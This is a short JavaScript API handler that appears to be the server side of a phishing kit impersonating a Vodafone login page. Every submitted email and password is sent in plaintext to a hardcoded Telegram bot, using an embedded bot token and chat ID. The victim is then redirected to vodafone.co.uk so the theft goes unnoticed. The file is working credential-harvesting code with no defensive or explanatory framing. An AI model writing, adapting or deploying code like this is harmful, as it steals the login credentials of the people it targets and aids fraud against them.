// /api/submit.js

const axios = require('axios');

const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Your Telegram bot token
const chatId = '7587120060'; // Your Telegram chat ID

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: 'Email and password are required.' });
  }

  try {
    const message = `🔐 New login attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;

    await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });

    res.status(200).json({ redirect: 'https://www.vodafone.co.uk/ ' });
  } catch (error) {
    console.error('Error sending message:', error.message);
    res.status(500).json({ message: 'Failed to process request' });
  }
}
